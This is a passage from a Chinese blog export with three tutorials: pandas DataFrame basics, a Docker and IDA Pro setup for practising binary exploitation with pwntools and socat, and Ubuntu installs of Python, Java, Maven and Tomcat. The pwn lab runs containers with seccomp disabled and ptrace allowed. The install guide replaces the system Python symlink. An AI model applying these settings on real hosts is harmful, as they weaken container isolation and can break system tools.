<h3 id="基于Series字典创建"><a href="#基于Series字典创建" class="headerlink" title="基于Series字典创建"></a>基于Series字典创建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;&apos;c1&apos;: pd.Series([1, 2, 3]),</span><br><span class="line">                   &apos;c2&apos;: pd.Series([4, 5, 6])&#125;)</span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure>

<h3 id="基于字典列表"><a href="#基于字典列表" class="headerlink" title="基于字典列表"></a>基于字典列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame([&#123;&apos;c1&apos;: 1, &apos;c2&apos;: 4&#125;,</span><br><span class="line">                   &#123;&apos;c1&apos;: 2, &apos;c2&apos;: 5&#125;,</span><br><span class="line">                   &#123;&apos;c1&apos;: 3, &apos;c2&apos;: 6&#125;])</span><br></pre></td></tr></table></figure>

<p><img src="/images/pandas-basic/03.png" alt="pic02"></p>
<h3 id="基于NumPy的二维ndarray创建"><a href="#基于NumPy的二维ndarray创建" class="headerlink" title="基于NumPy的二维ndarray创建"></a>基于NumPy的二维ndarray创建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c=np.random.randint(5, size=(2, 4))</span><br><span class="line">print(c)</span><br><span class="line">df = pd.DataFrame(c)</span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure>

<p><img src="/images/pandas-basic/04.png" alt="pic02"><br>不指定列的时候索引或者名称是数字从0开始<br>指定列索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(np.random.rand(2, 5), columns=list(&apos;ABCDE&apos;))</span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure>

<p><img src="/images/pandas-basic/4_1.png" alt="pic02"></p>
<h1 id="2-数据读取"><a href="#2-数据读取" class="headerlink" title="2.数据读取"></a>2.数据读取</h1><p><a href="https://pandas.pydata.org/pandas-docs/stable/reference/io.html" target="_blank" rel="noopener">官方文档</a><br>一般可以用于读取csv文件，其他文件格式参考官方文档</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.read_csv(&quot;./data/los_census.csv&quot;)</span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure>

<p>数据来源<code>https://labfile.oss.aliyuncs.com/courses/906/los_census.csv</code></p>
<h2 id="数据省略号解决方案"><a href="#数据省略号解决方案" class="headerlink" title="数据省略号解决方案"></a>数据省略号解决方案</h2><blockquote>
<p>数据显示的时候，会有省略号，具体见参考文献[2]</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pd.set_option(&apos;display.max_columns&apos;, 1000)</span><br><span class="line">pd.set_option(&apos;display.width&apos;, 1000)</span><br><span class="line">pd.set_option(&apos;display.max_colwidth&apos;, 1000)</span><br></pre></td></tr></table></figure>

<h2 id="数据预览"><a href="#数据预览" class="headerlink" title="数据预览"></a>数据预览</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df.head()  # 默认显示前 5 条</span><br><span class="line">df.tail(10)  # 指定显示后 10 条</span><br><span class="line">df.describe() # 数据集概览，计数，最值，平均值</span><br><span class="line">df.values # DataFrame 转换为 NumPy 数组</span><br><span class="line">df.index  # 查看索引</span><br><span class="line">df.columns  # 查看列名</span><br><span class="line">df.shape  # 查看形状</span><br></pre></td></tr></table></figure>

<h1 id="3-数据选择"><a href="#3-数据选择" class="headerlink" title="3.数据选择"></a>3.数据选择</h1><h2 id="基于索引选择"><a href="#基于索引选择" class="headerlink" title="基于索引选择"></a>基于索引选择</h2><p>主要涉及到<code>.iloc</code>，<a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.iloc.html#pandas.DataFrame.iloc" target="_blank" rel="noopener">官方文档</a><br><strong>默认从0开始</strong>，类似与切片<br>主要结构<code>df.iloc[[rows],[coloms]]</code></p>
<h3 id="选择特定的行"><a href="#选择特定的行" class="headerlink" title="选择特定的行"></a>选择特定的行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.read_csv(&quot;./data/los_census.csv&quot;)</span><br><span class="line">selectd=df.iloc[:3]  #选择前三行</span><br><span class="line">print(selectd)</span><br></pre></td></tr></table></figure>

<p>选择第三行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">selectd=df.iloc[3]  #选择前三行</span><br></pre></td></tr></table></figure>

<p>选择1，3，5行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">selectd=df.iloc[[1,3,5]]  #选择前三行</span><br></pre></td></tr></table></figure>

<h3 id="选择特定的列"><a href="#选择特定的列" class="headerlink" title="选择特定的列"></a>选择特定的列</h3><p>选择第2-4列的所有数据，下标从0开始，最后一个不取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.read_csv(&quot;./data/los_census.csv&quot;)</span><br><span class="line">selectd=df.iloc[:, 1:4]</span><br><span class="line">print(selectd)</span><br></pre></td></tr></table></figure>

<h2 id="基于标签名选择"><a href="#基于标签名选择" class="headerlink" title="基于标签名选择"></a>基于标签名选择</h2><p>主要是<code>.loc</code>，<a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.loc.html#pandas.DataFrame.loc" target="_blank" rel="noopener">官方文档</a></p>
<p>选择1，3，5行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df.loc[[0, 2, 4]]</span><br></pre></td></tr></table></figure>

<p>选择2-4列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.read_csv(&quot;./data/los_census.csv&quot;)</span><br><span class="line">print(df.columns )</span><br><span class="line">c = df.loc[:, &apos;Total Population&apos;:&apos;Total Males&apos;] #选择2-4列</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<p><img src="/images/pandas-basic/05.png" alt="pic02"><br>选择1，3行和Median Age及其后面的列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df.loc[[0, 2], &apos;Median Age&apos;:]</span><br></pre></td></tr></table></figure>

<h1 id="4-数据删减"><a href="#4-数据删减" class="headerlink" title="4.数据删减"></a>4.数据删减</h1><p>与数据选择可以补充使用，可以去掉指定的行或者列，<code>DataFrame.drop</code>等价选择了<br><a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.drop.html#pandas.DataFrame.drop" target="_blank" rel="noopener">官方文档</a><br>参数<code>axis=1</code>指定按列删除数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.read_csv(&quot;./data/los_census.csv&quot;)</span><br><span class="line">print(df.columns )</span><br><span class="line">c = df.drop(labels=[&apos;Median Age&apos;, &apos;Total Males&apos;], axis=1)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<p><img src="/images/pandas-basic/06.png" alt="pic02"><br>数据去重</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df.drop_duplicates()</span><br></pre></td></tr></table></figure>

<p>删除空缺的行或者列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df.dropna()</span><br></pre></td></tr></table></figure>

<h1 id="5-数据填充"><a href="#5-数据填充" class="headerlink" title="5.数据填充"></a>5.数据填充</h1><p>对缺少的值进行数据填充</p>
<h2 id="检测缺失值"><a href="#检测缺失值" class="headerlink" title="检测缺失值"></a>检测缺失值</h2><p>对于不同数据的缺失都采用<code>NaN</code>作为缺失标记，时间戳丢失采用<code>NAT</code>标记。<br>主要有两个函数<code>isna()</code>和<code>notna</code><br>构建一个含缺失数据的数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(np.random.rand(9, 5), columns=list(&apos;ABCDE&apos;))</span><br><span class="line"># 插入 T 列，并打上时间戳</span><br><span class="line">df.insert(value=pd.Timestamp(&apos;2017-10-1&apos;), loc=0, column=&apos;Time&apos;)</span><br><span class="line"># 将 1, 3, 5 列的 1，3，5 行置为缺失值</span><br><span class="line">df.iloc[[1, 3, 5, 7], [0, 2, 4]] = np.nan</span><br><span class="line"># 将 2, 4, 6 列的 2，4，6 行置为缺失值</span><br><span class="line">df.iloc[[2, 4, 6, 8], [1, 3, 5]] = np.nan</span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure>

<p>数据如下所示<br><img src="/images/pandas-basic/07.png" alt="pic02"><br>此时通过<code>isna()</code>或者<code>notna()</code>查看缺失的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">temp = df.isna()</span><br><span class="line">print(temp)</span><br></pre></td></tr></table></figure>

<p>结果如下所示<br><img src="/images/pandas-basic/08.png" alt="pic02"></p>
<h2 id="填充缺失值"><a href="#填充缺失值" class="headerlink" title="填充缺失值"></a>填充缺失值</h2><h3 id="填充相同的值"><a href="#填充相同的值" class="headerlink" title="填充相同的值"></a>填充相同的值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t2 = df.fillna(0)</span><br><span class="line">print(t2)</span><br></pre></td></tr></table></figure>

<p>填充后数据如下<br><img src="/images/pandas-basic/09.png" alt="pic02"></p>
<h3 id="使用缺失值前面的值填充"><a href="#使用缺失值前面的值填充" class="headerlink" title="使用缺失值前面的值填充"></a>使用缺失值前面的值填充</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t2 = df.fillna(method=&apos;pad&apos;)</span><br><span class="line">print(t2)</span><br></pre></td></tr></table></figure>

<p>填充后数据如下<br><img src="/images/pandas-basic/10.png" alt="pic02"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df.fillna(method=&apos;pad&apos;) #使用后面的值填充</span><br><span class="line">df.fillna(method=&apos;pad&apos;, limit=1)  # 连续缺失，限制最多填充一项</span><br></pre></td></tr></table></figure>

<h3 id="使用平均值填充"><a href="#使用平均值填充" class="headerlink" title="使用平均值填充"></a>使用平均值填充</h3><p>对c,e两列使用平均值填充</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t2 = df.fillna(df.mean()[&apos;C&apos;:&apos;E&apos;])</span><br><span class="line">print(t2)</span><br></pre></td></tr></table></figure>

<p>填充后的数据如下：<br><img src="/images/pandas-basic/11.png" alt="pic02"></p>
<h3 id="使用插值填充"><a href="#使用插值填充" class="headerlink" title="使用插值填充"></a>使用插值填充</h3><p><a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.interpolate.html#pandas.DataFrame.interpolate" target="_blank" rel="noopener">官方文档</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 生成一个 DataFrame</span><br><span class="line">df = pd.DataFrame(&#123;&apos;A&apos;: [1.1, 2.2, np.nan, 4.5, 5.7, 6.9],</span><br><span class="line">                   &apos;B&apos;: [.21, np.nan, np.nan, 3.1, 11.7, 13.2]&#125;)</span><br><span class="line">print(df)</span><br><span class="line">df_interpolate = df.interpolate()</span><br><span class="line">print(df_interpolate)</span><br></pre></td></tr></table></figure>

<h1 id="6-数据可视化"><a href="#6-数据可视化" class="headerlink" title="6.数据可视化"></a>6.数据可视化</h1><p>可以使用 Pandas 提供的 <code>DataFrame.plot</code> 方法调用Matplotlib接口绘图。<br>简单易用，适合于数据的快速呈现和预览<br><a href="https://pandas.pydata.org/pandas-docs/stable/reference/frame.html#plotting" target="_blank" rel="noopener">官方文档</a></p>
<h2 id="准备数据"><a href="#准备数据" class="headerlink" title="准备数据"></a>准备数据</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;&apos;A&apos;: [1.1, 2.2, np.nan, 4.5, 5.7, 6.9],</span><br><span class="line">                   &apos;B&apos;: [.21, np.nan, np.nan, 3.1, 11.7, 13.2]&#125;)</span><br><span class="line">print(df)</span><br><span class="line">df_interpolate = df.interpolate()</span><br><span class="line">print(df_interpolate)</span><br></pre></td></tr></table></figure>

<p><img src="/images/pandas-basic/12.png" alt="pic02"></p>
<h2 id="数据展示"><a href="#数据展示" class="headerlink" title="数据展示"></a>数据展示</h2><h3 id="线性图绘制"><a href="#线性图绘制" class="headerlink" title="线性图绘制"></a>线性图绘制</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">#...省略数据准备代码</span><br><span class="line">t=df_interpolate.plot()</span><br><span class="line">plt.show(t)</span><br></pre></td></tr></table></figure>

<p>展示的数据如图所示<br><img src="/images/pandas-basic/13.png" alt="pic02"></p>
<h3 id="柱状图绘制"><a href="#柱状图绘制" class="headerlink" title="柱状图绘制"></a>柱状图绘制</h3><p>也可以展示位柱状图</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t=df_interpolate.plot(kind=&apos;bar&apos;)</span><br><span class="line">plt.show(t)</span><br></pre></td></tr></table></figure>

<p>#参考文献<br>[1] <a href="https://www.shiyanlou.com/courses/906/learning/?id=3375" target="_blank" rel="noopener">https://www.shiyanlou.com/courses/906/learning/?id=3375</a><br>[2] <a href="https://blog.csdn.net/Ramer42/article/details/83178653" target="_blank" rel="noopener">https://blog.csdn.net/Ramer42/article/details/83178653</a></p>
]]></content>
      <categories>
        <category>Numpy</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>pandas</tag>
      </tags>
  </entry>
  <entry>
    <title>docker-IDAPro</title>
    <url>/2019/10/30/docker-IDAPro/</url>
    <content><![CDATA[<p>docker与IDAPRO搭建二进制漏洞环境</p>
<a id="more"></a>
<h2 id="1-docker安装与基本操作"><a href="#1-docker安装与基本操作" class="headerlink" title="1. docker安装与基本操作"></a>1. docker安装与基本操作</h2><h3 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h3><p><a href="https://www.docker.com/" target="_blank" rel="noopener">官网</a><br><a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">runoob安装教程</a></p>
<h3 id="1-2-基本操作"><a href="#1-2-基本操作" class="headerlink" title="1.2 基本操作"></a>1.2 基本操作</h3><h4 id="导入镜像-别人已经准备好的"><a href="#导入镜像-别人已经准备好的" class="headerlink" title="导入镜像(别人已经准备好的)"></a>导入镜像(别人已经准备好的)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat ubuntu.17.04.amd64 | docker import - ubuntu/17.04.amd64(可自己命名)</span><br></pre></td></tr></table></figure>

<p>ubuntu.17.04.amd64是一个本地的镜像文件，后面一个名字可以自己定义</p>
<h4 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h4><p>导入成功后，可以使用命令查看docker所有的已经导入的镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="/images/docker-idapro/doker01.png" alt="pic1"></p>
<h4 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h4><p>可以看作是启动一个任务<br><code>docker run</code>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it -p 23946:23946 ubuntu/17.04.amd64 /bin/bash</span><br><span class="line">#或者</span><br><span class="line">docker run -i -t -p 23946:23946 ubuntu/17.04.amd64 /bin/bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>-i</code> 允许对容器内的标准输入<br><code>-t</code> 在新的容器内指定一个伪终端或者终端<br><code>-p</code> 容器内部使用的网络端口映射到使用的主机上面，<strong>前面一个是本地主机端口</strong><br><code>ubuntu/17.04.amd64</code> 这是镜像名字<br><code>/bin/bash</code> 运行的命令</p>
</blockquote>
<h4 id="查看docker运行的所有容器"><a href="#查看docker运行的所有容器" class="headerlink" title="查看docker运行的所有容器"></a>查看docker运行的所有容器</h4><p>在运行的主机上打开一个新的shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps #查看所有正在运行的容器</span><br></pre></td></tr></table></figure>

<p><img src="/images/docker-idapro/d02.png" alt="pic1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker container ls -a #查看所有的容器情况</span><br></pre></td></tr></table></figure>

<p><img src="/images/docker-idapro/d03.png" alt="pic1"></p>
<blockquote>
<p>拓展：可以修改容器的名字<br><code>docker container rename  [autoname] [yourname]</code><br><code>docker start id/name</code> 启动容器</p>
</blockquote>
<h4 id="在已经运行的镜像或者容器内打开一个新的bash-shell"><a href="#在已经运行的镜像或者容器内打开一个新的bash-shell" class="headerlink" title="在已经运行的镜像或者容器内打开一个新的bash shell"></a>在已经运行的镜像或者容器内打开一个新的bash shell</h4><p>有时候一个容器的shell阻塞了，我们需要新的bash shell，可以使用如下的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it ubuntu17.04 /bin/bash</span><br><span class="line">#或者  containerID是一个id号</span><br><span class="line">docker exec -it containerID /bin/bash</span><br></pre></td></tr></table></figure>

<h4 id="容器和主机之间的文件传送"><a href="#容器和主机之间的文件传送" class="headerlink" title="容器和主机之间的文件传送"></a>容器和主机之间的文件传送</h4><p><strong>可以使用如下命令在容器和主机之间双向传送文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker container cp [localhostFilePath] [imageName]|[containerID]:[filePath]</span><br></pre></td></tr></table></figure>

<p>eg: <code>docker container cp linux_server ubuntu.17.04.i386:/root/linux_server</code></p>
<blockquote>
<p><strong>注意</strong>这个imageName指的是某一个容器的名字，而非镜像名字，id也是容器的id。</p>
</blockquote>
<h4 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h4><p>此时拥有shell，使用命令<code>exit</code>或者键盘<code>ctrl+D</code><br>如果没有shell，先<code>docker ps</code>得到容器id或者name，然后使用<code>docker stop id/name</code>结束容器</p>
<h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm id/name</span><br></pre></td></tr></table></figure>

<h2 id="2-IDAPro简单使用"><a href="#2-IDAPro简单使用" class="headerlink" title="2. IDAPro简单使用"></a>2. IDAPro简单使用</h2><p>在远程连接时候，需要<strong>关闭docke远程执行命令保护</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --security-opt seccomp:unconfined -it -p 23946:23946 ubuntu.17.04.i386 /bin/bash</span><br></pre></td></tr></table></figure>

<p>将IDA所在文件夹下的dbgsrv的linux_server或则linux_server64复制到主机上，并使用<code>docker container cp</code>命令传送到容器的某一个路径下。<br>加权限然后运行，可以看到侦听端口，新打开一个bash shell。</p>
<table>
 <tr><th>快捷键</th><th>功能</th></tr>
 <tr><td>F2</td><td>设置断点/取消断点</td></tr>
 <tr><td>F7</td><td>单步进入函数</td></tr>
 <tr><td>F8</td><td>单步跨过函数</td></tr>
 <tr><td>F9</td><td>运行程序</td></tr>
</table>

<p><strong>动态调试的时候，如果遇到程序输入，可以在<code>linux_server</code>运行的接口输入字符</strong></p>
<h2 id="3-ubuntu16-04安装pwntools模块"><a href="#3-ubuntu16-04安装pwntools模块" class="headerlink" title="3.ubuntu16.04安装pwntools模块"></a>3.ubuntu16.04安装pwntools模块</h2><p><a href="https://docs.pwntools.com/en/stable/install.html" target="_blank" rel="noopener">官网链接</a><br>先升级setuptools</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install -U setuptools</span><br></pre></td></tr></table></figure>

<p>然后安装pwntools模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可能出现错误<br><code>ERROR: Package &#39;more-itertools&#39; requires a different Python: 2.7.15 not in &#39;&gt;=3.4&#39;</code><br>解决办法：单独安装more-itertools模块<br><code>pip install more-itertools==5.0.0</code><br>然后再次安装<code>pip install pwntools</code></p>
</blockquote>
<p>测试安装成功，没有报错误就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line">import pwn</span><br><span class="line">pwn.asm(&quot;xor eax,eax&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="4-pwntools和IDA调试程序"><a href="#4-pwntools和IDA调试程序" class="headerlink" title="4.pwntools和IDA调试程序"></a>4.pwntools和IDA调试程序</h2><p>期间使用IDAPro远程attach的时候报了一个错<br><code>This can perhaps indicate the process was just terminated, or that you don&#39;t have the necessary privileges.</code></p>
<blockquote>
<p>解决办法<br>重新启动容器，使用如下命令运行<br><code>docker run --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -it -p 23900:23946 ubuntu:18.04 /bin/bash</code></p>
</blockquote>
<h3 id="设置程序的IO转发"><a href="#设置程序的IO转发" class="headerlink" title="设置程序的IO转发"></a>设置程序的IO转发</h3><ul>
<li><p>打开一个新的bash，切换到容器的运行程序目录下。</p>
</li>
<li><p><code>ifconfig</code>查看ip地址</p>
</li>
<li><p>执行命令，设置IO转发到10001<br><code>socat tcp-listen:10001,reuseaddr,fork EXEC:./heapTest_x86,pty,raw,echo=0</code><br><code>socat</code>命令介绍查看<a href="#ref3">参考文献3</a></p>
</li>
<li><p>主机python使用pwntools</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(&quot;172.17.0.2&quot;, 10001)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="IDA中的操作"><a href="#IDA中的操作" class="headerlink" title="IDA中的操作"></a>IDA中的操作</h3><p><code>call ___isoc99_scanf</code>处设置断点<br><code>Debugger-&gt;Attach to process...</code>附加到<code>./heapTest_x86</code>的进程上<br>回到python程序<br><code>io.recv( )</code>用于接收显示的数据<br><code>io.send( )</code>发送数据<br><code>io.sendline( )</code>用于回车</p>
<h3 id="结束调试"><a href="#结束调试" class="headerlink" title="结束调试"></a>结束调试</h3><p>python程序中<code>io.close( )</code><br>ida软件中<code>CTRL+F2</code></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="https://blog.csdn.net/asd413850393/article/details/101349924" target="_blank" rel="noopener">https://blog.csdn.net/asd413850393/article/details/101349924</a><br>[2] <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-04-05.Pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E2%80%94Ubuntu16.04.md" target="_blank" rel="noopener">https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-04-05.Pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E2%80%94Ubuntu16.04.md</a><br>[3] <span id="ref3"><a href="http://brieflyx.me/2015/linux-tools/socat-introduction/" target="_blank" rel="noopener">http://brieflyx.me/2015/linux-tools/socat-introduction/</a></span><br>[4] <a href="https://zhuanlan.zhihu.com/p/71914632" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/71914632</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>IDAPro</tag>
      </tags>
  </entry>
  <entry>
    <title>SoftWareInstall</title>
    <url>/2019/10/28/SoftWareInstall/</url>
    <content><![CDATA[<p> 软件环境的安装和配置</p>
<a id="more"></a>
<h1 id="0x00-ubuntu16-04下的python3-7安装"><a href="#0x00-ubuntu16-04下的python3-7安装" class="headerlink" title="0x00 ubuntu16.04下的python3.7安装"></a>0x00 ubuntu16.04下的python3.7安装</h1><blockquote>
<p>ubuntu16.04默认安装有python3.5和python2.7<br>安装路径在<code>/usr/local/lib</code>下</p>
</blockquote>
<p>可以通过如下命令查看python的指向</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ll /usr/bin | grep python</span><br></pre></td></tr></table></figure>

<p>可以知道python的默认指向时python2.7</p>
<ul>
<li><p>step1： 下载python3.7</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.7.1/Python-3.7.1.tgz</span><br></pre></td></tr></table></figure>
</li>
<li><p>step2: 解压安装包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf Pyhon-3.7.1.tgz</span><br></pre></td></tr></table></figure>
</li>
<li><p>step3: 编译安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd Python-3.7.1</span><br><span class="line">./configure --prefix=/usr/local/python3.7.1</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>经过上面步骤有</p>
<table>
<tr><td>文件</td><td>路径</td></tr>
<tr><td>可执行文件</td><td>/usr/local/python3.7.1/bin</td></tr>
<tr><td>库文件</td><td>/usr/local/python3.7/lib</td></tr>
<tr><td>配置文件</td><td>/usr/local/python3.7/share</td></tr>
</table>

<ul>
<li><p>step4：配置环境变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看环境变量</span><br><span class="line">echo $PATH</span><br><span class="line">vim ~/bashrc</span><br><span class="line">#添加如下的语句</span><br><span class="line">PATH=$PATH:$HOME/bin:/usr/local/python3.7.1/bin</span><br><span class="line">source ~/bashrc</span><br></pre></td></tr></table></figure>
</li>
<li><p>step5: 测试：<br>输入<code>python3.7</code>可进入python解释器即可<br><code>python -V</code>查看版本。<br>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">print(sys.version)</span><br><span class="line">print(sys.version_info)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p><strong>zlib模块缺失的解决方法</strong>：<br>官网下载zlib<code>wget http://zlib.net/zlib-1.2.11.tar.gz</code>，可以查看最新版本<br>然后解压，配置，安装<br>tar -xvf zlib-1.2.11.tar.gz<br>cd zlib-1.2.11<br>./configure<br>make<br>make install<br>最后重新编译安装python3.7</p>
</blockquote>
<blockquote>
<p><strong>No module named ‘_ctypes’解决方案</strong><br><code>sudo apt-get install libffi-dev</code><br>最后重新编译安装python3.7</p>
</blockquote>
<ul>
<li>step6: 修改系统默认指向<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">删除原有链接备份</span><br><span class="line">mv /usr/bin/python /usr/bin/python.bak</span><br><span class="line">建立新的链接</span><br><span class="line">ln -s /usr/local/python3.7.1/bin/python3.7 /usr/bin/python</span><br><span class="line">修改pip</span><br><span class="line">mv /usr/bin/pip /usr/bin/pip.bak</span><br><span class="line">建立新的pip</span><br><span class="line">ln -s /usr/local/python3.7.1/bin/pip3 /usr/bin/pip</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="0x01-ubuntu16-04-Java环境配置"><a href="#0x01-ubuntu16-04-Java环境配置" class="headerlink" title="0x01 ubuntu16.04 Java环境配置"></a>0x01 ubuntu16.04 Java环境配置</h1><ol>
<li>首先下载jdk文件：eg:<code>jdk-8u181-linux-x64.tar.gz</code></li>
<li>新建目录<code>/usr/lib/jdk</code></li>
<li>解压至该目录</li>
<li>配置环境变量<br>这里选择配置<code>/etc/profile</code>文件<br>在末尾添加如下代码<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set java env</span><br><span class="line">export JAVA_HOME=/usr/lib/jdk/jdk1.8.0_202</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre    </span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib    </span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>5 使配置生效<code>source /etc/profile</code><br>6 测试<code>java -version</code></p>
<h1 id="0x02-ubuntu16-04-maven安装"><a href="#0x02-ubuntu16-04-maven安装" class="headerlink" title="0x02 ubuntu16.04 maven安装"></a>0x02 ubuntu16.04 maven安装</h1><ol>
<li><p>下载maven二进制文件：eg:<code>apache-maven-3.6.3-bin.tar.gz</code></p>
</li>
<li><p>解压到目录<code>/opt/maven</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz -C /opt/maven</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置maven环境变量<br><code>vim /etc/profile</code><br>添加如下代码：<br>使之生效<code>source /etc/profile</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export M2_HOME=/opt/maven/apache-maven-3.5.0</span><br><span class="line">export CLASSPATH=$CLASSPATH:$M2_HOME/lib</span><br><span class="line">export PATH=$PATH:$M2_HOME/bin</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试<br><code>mvn -v</code></p>
</li>
<li><p>修改镜像地址<br><code>vim  /opt/maven/apache-maven-3.5.0/conf/settings.xml</code><br>修改镜像为阿里云</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;mirror&gt;</span><br><span class="line">    &lt;id&gt;nexus-aliyun&lt;/id&gt;</span><br><span class="line">    &lt;mirrorOf&gt;*&lt;/mirrorOf&gt;</span><br><span class="line">    &lt;name&gt;Nexus aliyun&lt;/name&gt;</span><br><span class="line">    &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt;</span><br><span class="line">&lt;/mirror&gt;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="0x03-ubuntu16-04-tomcat安装"><a href="#0x03-ubuntu16-04-tomcat安装" class="headerlink" title="0x03 ubuntu16.04 tomcat安装"></a>0x03 ubuntu16.04 tomcat安装</h1><ol>
<li><p>下载tomcat二进制文件<br><a href="https://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">https://tomcat.apache.org/download-70.cgi</a></p>
</li>
<li><p>移动<code>apache-tomcat-7.0.99.tar.gz</code>并解压到<code>/opt/tomcat</code>目录下</p>
